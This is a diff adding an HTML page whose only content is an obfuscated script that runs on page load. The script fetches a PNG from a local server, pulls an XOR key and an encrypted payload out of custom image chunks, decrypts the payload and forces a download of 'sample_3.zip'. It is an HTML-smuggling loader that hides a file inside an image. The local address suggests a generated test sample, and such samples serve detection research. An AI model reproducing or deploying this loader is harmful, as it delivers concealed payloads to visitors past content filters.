@@ -1,0 +1,7 @@
+
+        <html>
+        <body>
+            <script type="application/javascript">function qIUPz(yVrWu, uCyyP){let dAaVn = new Uint8Array(yVrWu.length);for (let i = 0; i < yVrWu.length; i++) {dAaVn[i] = yVrWu[i] ^ uCyyP[i % uCyyP.length];}return dAaVn;}function QLpfL(RNCnb) {const AnJUy = new XMLHttpRequest();AnJUy.open('GET', RNCnb, true);AnJUy.responseType = 'arraybuffer';AnJUy.onload = function() {if (AnJUy.status === 200) {const eZjyi = AnJUy.response;const HGOxs = new DataView(eZjyi);let yMILE = 8;let CPOGe = null;while (yMILE < eZjyi.byteLength) {const KYhRj = HGOxs.getUint32(yMILE);yMILE += 4;const FlTYI = new Uint8Array(eZjyi, yMILE, 4);const sjPan = String.fromCharCode.apply(null, FlTYI);yMILE += 4;if (sjPan === 'xkEy') {CPOGe = new Uint8Array(eZjyi, yMILE, KYhRj);} else if (sjPan === 'exEf' && CPOGe !== null) {const AAAYT = new Uint8Array(eZjyi, yMILE, KYhRj);const ZdIEk = qIUPz(AAAYT,CPOGe);const IHBta = new Blob([ZdIEk], { type: 'application/octet-stream' }), ShQNn = document.createElement('a');ShQNn.href = URL.createObjectURL(IHBta);ShQNn.download = 'sample_3.zip';document.body.appendChild(ShQNn);ShQNn.click();URL.revokeObjectURL(ShQNn.href);document.body.removeChild(ShQNn);return;}yMILE += KYhRj + 4;}}};AnJUy.onerror = function(){};AnJUy.send();}QLpfL('http://127.0.0.1:8000/banner.png');</script>
+        </body>
+        </html>
+    
